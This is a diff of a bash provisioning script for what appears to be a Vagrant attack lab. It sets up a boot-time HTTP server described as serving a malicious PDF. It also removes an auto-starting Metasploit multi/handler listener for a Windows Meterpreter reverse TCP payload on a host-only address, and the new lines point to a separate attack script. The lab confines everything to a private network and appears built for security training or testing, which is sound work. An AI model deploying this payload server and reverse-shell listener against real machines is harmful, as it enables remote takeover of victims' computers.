@@ -1,23 +1,22 @@
 #!/bin/bash
-# Setup automatic HTTP server and Metasploit listener on boot
+# Setup automatic HTTP server on boot
 
-echo "Setting up automatic services on boot..."
+echo "Setting up automatic HTTP server on boot..."
 
 # Ensure .msf4/local directory exists
 mkdir -p /home/vagrant/.msf4/local
 
-# Create systemd service file
+# Create systemd service file for HTTP server
 sudo tee /etc/systemd/system/pdf-server.service > /dev/null << 'EOF'
 [Unit]
 Description=Malicious PDF HTTP Server
-After=network-online.target sys-subsystem-net-devices-eth1.device
-Wants=network-online.target sys-subsystem-net-devices-eth1.device
+After=network-online.target
 
 [Service]
 Type=simple
 User=vagrant
 WorkingDirectory=/home/vagrant/.msf4/local
-# Bind only to host-only interface (192.168.56.101) on eth1
+# Bind only to host-only interface (192.168.56.101)
 ExecStart=/usr/bin/python3 -m http.server 8080 --bind 192.168.56.101
 Restart=always
 RestartSec=10
@@ -26,7 +25,7 @@ RestartSec=10
 WantedBy=multi-user.target
 EOF
 
-# Enable the service (will start on boot)
+# Enable the HTTP server service (will start on boot)
 sudo systemctl daemon-reload
 sudo systemctl enable pdf-server.service
 
@@ -48,130 +47,12 @@ else
 fi
 
 echo ""
-echo "Setting up automatic Metasploit listener..."
-
-# Create directory for Metasploit configuration
-sudo mkdir -p /etc/metasploit
-
-# Initialize Metasploit database as vagrant user if needed
-echo "  Initializing Metasploit database..."
-sudo -u vagrant msfdb init 2>/dev/null || echo "  Database already initialized or initialization skipped"
-
-# Create cache and tmp directories for vagrant user (avoids permission issues)
-echo "  Creating cache and temp directories..."
-mkdir -p /home/vagrant/.cache /home/vagrant/tmp
-chown -R vagrant:vagrant /home/vagrant/.cache /home/vagrant/tmp
-chmod 700 /home/vagrant/.cache /home/vagrant/tmp
-
-# Create wrapper script to start and keep Metasploit listener alive
-sudo tee /usr/local/bin/metasploit-listener-service.sh > /dev/null << 'WRAPPER_EOF'
-#!/bin/bash
-# Metasploit Listener Service Wrapper
-# Starts the listener and keeps the process alive
-
-cd /home/vagrant
-
-# Create temporary resource script
-cat > /tmp/listener_service.rc << 'EOF'
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.56.101
-set LPORT 4444
-set ReverseListenerBindAddress 192.168.56.101
-set ExitOnSession false
-set SessionCommunicationTimeout 300
-set EnableStageEncoding true
-exploit -j -z
-EOF
-
-# Start msfconsole with resource script, then keep alive with tail
-# The tail command will block forever, keeping msfconsole running
-tail -f /dev/null | /usr/bin/msfconsole -q -r /tmp/listener_service.rc
-WRAPPER_EOF
-
-sudo chmod +x /usr/local/bin/metasploit-listener-service.sh
-
-# Create systemd service for Metasploit listener
-sudo tee /etc/systemd/system/metasploit-listener.service > /dev/null << 'EOF'
-[Unit]
-Description=Metasploit Listener for PDF Exploit
-After=network-online.target sys-subsystem-net-devices-eth1.device
-Wants=network-online.target sys-subsystem-net-devices-eth1.device
-
-[Service]
-Type=simple
-User=vagrant
-WorkingDirectory=/home/vagrant
-Environment="HOME=/home/vagrant"
-Environment="XDG_CACHE_HOME=/home/vagrant/.cache"
-Environment="TMPDIR=/home/vagrant/tmp"
-# Bind explicitly to host-only interface eth1 (192.168.56.101:4444)
-# Wrapper script starts listener and keeps process alive with tail -f /dev/null
-ExecStart=/usr/local/bin/metasploit-listener-service.sh
-Restart=always
-RestartSec=10
-StandardOutput=journal
-StandardError=journal
-# Prevent OOM killer from stopping the service
-OOMScoreAdjust=-900
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Enable the Metasploit listener service
-sudo systemctl daemon-reload
-sudo systemctl enable metasploit-listener.service
-
-# Create helper script to start the listener (for troubleshooting)
-sudo tee /usr/local/bin/start-metasploit-listener.sh > /dev/null << 'HELPER_EOF'
-#!/bin/bash
-echo "Starting Metasploit listener service..."
-sudo systemctl start metasploit-listener.service
-sleep 5
-
-if sudo systemctl is-active --quiet metasploit-listener.service; then
-    echo "✓ Service started successfully"
-    echo ""
-    echo "Waiting for port 4444 to become available..."
-    for i in {1..30}; do
-        if sudo ss -tuln | grep -q ":4444 "; then
-            echo "✓ Port 4444 is listening on 192.168.56.101"
-            echo ""
-            echo "Service status:"
-            sudo systemctl status metasploit-listener.service --no-pager -l
-            exit 0
-        fi
-        sleep 2
-    done
-    echo "⚠ Service running but port 4444 not detected after 60 seconds"
-    echo "  Check logs: sudo journalctl -u metasploit-listener -f"
-else
-    echo "✗ Service failed to start"
-    echo ""
-    echo "Recent logs:"
-    sudo journalctl -u metasploit-listener -n 50 --no-pager
-    exit 1
-fi
-HELPER_EOF
-
-sudo chmod +x /usr/local/bin/start-metasploit-listener.sh
-
-echo "✓ Metasploit listener service configured"
-echo "  Service will start automatically on boot"
-echo "  To start now: sudo systemctl start metasploit-listener.service"
-echo "  Helper script: start-metasploit-listener.sh"
-echo ""
-echo "  Note: During provisioning, eth1 may not be fully ready yet."
-echo "        The service will start automatically after reboot."
-
-echo ""
 echo "═══════════════════════════════════════════════════════════"
-echo "  Autostart Configuration Complete"
+echo "  HTTP Server Configuration Complete"
 echo "═══════════════════════════════════════════════════════════"
 echo ""
-echo "Services configured:"
-echo "  • HTTP Server:         192.168.56.101:8080"
-echo "  • Metasploit Listener: 192.168.56.101:4444"
+echo "HTTP Server: 192.168.56.101:8080"
+echo "Will start automatically on boot."
 echo ""
-echo "Both services will start automatically on boot."
+echo "To manually start Metasploit listener:"
+echo "  cd /vagrant/exploits && ./start_attack.sh"
